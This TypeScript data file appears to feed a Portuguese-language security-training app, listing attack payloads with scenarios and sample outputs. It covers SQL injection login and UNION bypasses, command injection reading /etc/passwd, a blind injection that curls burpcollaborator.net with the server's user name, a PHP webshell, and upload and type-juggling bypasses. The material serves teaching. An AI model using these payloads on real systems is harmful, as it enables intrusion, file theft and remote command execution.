export interface Vulnerability {
  id: string;
  title: string;
  scenario: string;
  payload: string;
  example: string;
  result: string;
}

export interface Topic {
  id: string;
  title: string;
  description: string;
  icon: string;
  vulnerabilities: Vulnerability[];
}

export const mockTopics: Topic[] = [
  {
    id: 'sql-injection',
    title: 'SQL Injection',
    description: 'Manipulação de consultas ao banco de dados',
    icon: 'Database', // Will map to a Lucide icon
    vulnerabilities: [
      {
        id: 'sqli-1',
        title: 'Bypass de Login Simples',
        scenario: 'Login form sem sanitização de input',
        payload: "' OR 1=1 --",
        example: "Acesso à rota de login (`POST /api/login`) passando o payload diretamente no campo `username`. A senha pode ser qualquer coisa.",
        result: "```json\n{\n  \"status\": \"success\",\n  \"message\": \"Welcome admin!\",\n  \"user\": {\n    \"id\": 1,\n    \"role\": \"admin\"\n  }\n}\n```"
      },
      {
        id: 'sqli-2',
        title: 'Time-Based Blind',
        scenario: 'Banco de dados MySQL/MariaDB (Wait for delay)',
        payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1",
        example: "Exemplo numa busca de produtos: `GET /items?category=shoes' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1`.",
        result: "**Resultado:**\nO servidor injeta o \`SLEEP(5)\` e a resposta da página demora **exatamente 5 segundos a mais** para ser devolvida, indicando que a injeção foi bem-sucedida e o banco está vulnerável."
      },
      {
        id: 'sqli-3',
        title: 'Auth Bypass (UNION)',
        scenario: 'Formulário que espera username válido e retorna erro caso exista',
        payload: "' UNION SELECT 1, 'admin', '81dc9bdb52d04dc20036dbd8313ed055'--",
        example: "Bypass quando o backend valida a senha num hash MD5 estático. O hash acima é `1234`.",
        result: "```html\n<!-- Resposta HTTP 200 OK -->\n<div class=\"dashboard\">\n  <h1>Painel de Controle</h1>\n  <p>Bem-vindo(a), admin!</p>\n</div>\n```"
      }
    ]
  },
  {
    id: 'command-injection',
    title: 'Command Injection',
    description: 'Execução arbitrária de comandos no SO',
    icon: 'Terminal',
    vulnerabilities: [
      {
        id: 'cmdi-1',
        title: 'Concatenação Simples',
        scenario: 'Input concatenado sem escape a um utilitário (ex: ping)',
        payload: "; cat /etc/passwd",
        example: "O sistema tem um formulário de ping: `POST /network/ping` com o IP `127.0.0.1; cat /etc/passwd`.",
        result: "```bash\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\n... e segue listando os usuários do sistema UNIX.\n```"
      },
      {
        id: 'cmdi-2',
        title: 'Bypass de Espaço',
        scenario: 'Filtro que remove espaços no input',
        payload: "${IFS}cat${IFS}/etc/passwd",
        example: "WAF ou regex que apaga/rejeita conexões com barra de espaço. `$IFS` (Internal Field Separator) é usado no lugar.",
        result: "```text\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n```\n_O resultado é impresso ignorando o filtro de espaço._"
      },
      {
        id: 'cmdi-3',
        title: 'Out of Band (OAST)',
        scenario: 'Blind command injection',
        payload: "curl http://burpcollaborator.net/`whoami`",
        example: "Injeção num processamento de logs assíncrono onde **não há retorno na tela**.",
        result: "**Resultado no Burp Collaborator:**\n\n\`\`\`http\nGET /www-data HTTP/1.1\nHost: burpcollaborator.net\nUser-Agent: curl/7.81.0\n\`\`\`\n\nA requisição de DNS/HTTP vaza que o usuário executando no servidor remoto é `www-data`."
      }
    ]
  },
  {
    id: 'php-bypasses',
    title: 'PHP Bypasses',
    description: 'Exploração de upload de arquivos e type juggling',
    icon: 'FileCode',
    vulnerabilities: [
      {
        id: 'php-1',
        title: 'Webshell Simples',
        scenario: 'Upload irrestrito com execução de .php',
        payload: "<?php system($_GET['cmd']); ?>",
        example: "Fez-se o upload deste script nomeado como `shell.php`. Depois é possível acessá-lo no navegador: `GET /uploads/shell.php?cmd=id`.",
        result: "```bash\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```"
      },
      {
        id: 'php-2',
        title: 'Bypass de Extensão',
        scenario: 'Filtro simples em extensões comuns',
        payload: "arquivo.php5 / arquivo.phtml / arquivo.pHp",
        example: "O desenvolvedor bloqueou a string exata `.php`. Podemos enviar um arquivo `shell.phtml` e o Apache continua a executar como PHP (se estiver mal configurado).",
        result: "**Upload Status:** `200 OK - File shell.phtml uploaded successfully!`.\nO arquivo agora existe e pode ser executado para uma Webshell."
      },
      {
        id: 'php-3',
        title: 'Type Juggling',
        scenario: 'Uso indevido de == ao invés de === em comparação de hash',
        payload: "0e123456",
        example: "Se o servidor comparar `if (md5($password) == \"0e...alguma coisa\")`. Podemos enviar \`0e123456\`.",
        result: "**Resultado:**\nO PHP com `==` trata strings que começam com `0e` seguidas de números como *Notação Científica* (`0 elevado a algo = 0`). Assim, `0e123` é avaliado como `0`, o que casa (`==`) com outro hash `0e999`.\nAutenticação realizada com sucesso sem precisar da senha verdadeira."
      }
    ]
  }
];
